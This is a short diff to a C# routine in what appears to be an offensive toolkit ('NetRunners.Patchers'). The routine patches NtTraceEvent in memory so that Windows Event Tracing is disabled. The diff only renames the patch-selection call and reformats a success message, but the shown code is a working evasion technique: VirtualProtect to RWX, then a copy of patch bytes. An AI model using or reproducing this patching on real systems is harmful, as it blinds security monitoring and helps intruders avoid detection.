@@ -37,12 +37,12 @@ namespace NetRunners.Patchers
                     throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");
 
                 // patch NtTraceEvent
-                patch = GetEtwPatch();
+                patch = SelectEtwPatch();
                 VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
                 Marshal.Copy(patch, 0, funcAddress, patch.Length);
                 VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x20, out oldProtect);
-                
-                Console.WriteLine("[+] Successfully Patched ETW!");
+
+                Console.WriteLine("[+] ETW Patch                :   Success!");
                 
                 return true;
             }
